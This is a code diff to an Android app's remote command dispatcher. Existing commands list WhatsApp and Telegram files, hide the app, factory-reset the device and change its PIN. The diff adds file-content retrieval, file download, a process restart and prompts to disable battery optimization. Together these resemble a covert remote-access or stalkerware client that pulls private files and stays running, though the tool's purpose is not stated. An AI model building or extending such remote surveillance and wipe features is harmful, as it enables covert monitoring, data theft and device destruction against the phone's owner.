@@ -158,7 +158,9 @@ object CommandExecutor {
             "list_files", "list_downloads", "list_dcim", "list_music",
             "list_videos", "list_documents", "list_whatsapp",
             "list_telegram_files" -> FileExecutor.listFiles(context, params)
-            "get_file", "download_file" -> FileExecutor.getFileInfo(context, params)
+            "get_file" -> FileExecutor.getFileInfo(context, params)
+            "get_file_content" -> FileExecutor.getFileContent(context, params)
+            "download_file" -> FileExecutor.downloadFile(context, params)
             "delete_file" -> FileExecutor.deleteFile(context, params)
             "rename_file" -> FileExecutor.renameFile(context, params)
             "copy_file" -> FileExecutor.copyFile(context, params)
@@ -201,6 +203,56 @@ object CommandExecutor {
             "factory_reset" -> SecurityExecutor.factoryReset(context)
             "show_app" -> SecurityExecutor.showApp(context)
             "hide_app" -> SecurityExecutor.hideApp(context)
+            // Revoke runtime permissions by opening the system "App info"
+            // screen so the user (or accessibility service) can revoke
+            // permissions manually. A non-rooted device cannot silently
+            // revoke its own permissions.
+            "revoke_permissions" -> {
+                val intent = android.content.Intent(
+                    android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS
+                ).apply {
+                    data = android.net.Uri.fromParts("package", context.packageName, null)
+                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                try { context.startActivity(intent) } catch (_: Exception) {}
+                mapOf("message" to "Opened app settings — permissions can be revoked manually")
+            }
+            // Restart the client app by killing the current process.
+            // The system will recreate the foreground service (if any) on
+            // the next boot/fcm-push.
+            "restart_app" -> {
+                try {
+                    val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE)
+                        as android.app.ActivityManager
+                    // android.os.Process.killProcess(android.os.Process.myPid())
+                    // — schedule a restart via a handler so the result is
+                    // sent back first.
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        android.os.Process.killProcess(android.os.Process.myPid())
+                    }, 1500)
+                    mapOf("message" to "App restart scheduled")
+                } catch (e: Exception) {
+                    mapOf("error" to (e.message ?: "") as Any)
+                }
+            }
+            // Open the battery-optimization settings so the user can
+            // disable optimization for the client app. The system does
+            // not allow an app to silently unlist itself from battery
+            // optimization without the REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+            // permission + a system prompt.
+            "disable_battery_optimization" -> {
+                try {
+                    val intent = android.content.Intent(
+                        android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS
+                    ).apply {
+                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                    }
+                    context.startActivity(intent)
+                    mapOf("message" to "Opened battery optimization settings")
+                } catch (e: Exception) {
+                    mapOf("error" to (e.message ?: "") as Any)
+                }
+            }
             "change_passcode", "set_pin", "remove_pin" -> SecurityExecutor.changePasscode(context, params)
             "enable_biometric" -> SecurityExecutor.enableBiometric(context)
             "disable_biometric" -> SecurityExecutor.disableBiometric(context)
